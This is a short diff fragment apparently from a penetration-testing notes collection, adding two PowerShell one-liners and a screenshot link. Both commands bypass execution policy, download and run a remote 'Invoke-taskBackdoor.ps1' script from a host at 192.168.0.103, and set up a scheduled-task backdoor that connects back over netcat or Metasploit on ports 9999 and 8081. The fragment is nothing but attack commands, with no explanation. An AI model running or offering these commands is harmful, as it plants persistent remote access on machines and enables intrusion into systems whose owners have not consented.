@@ -1,0 +1,3 @@
+	>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.103/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method nccat -ip 192.168.0.103 -port 9999 -time 2"
+	>powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.103/Invoke-taskBackdoor.ps1');Invoke-Tasksbackdoor -method msf -ip 192.168.0.103 -port 8081 -time 2"
+![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/535.png)
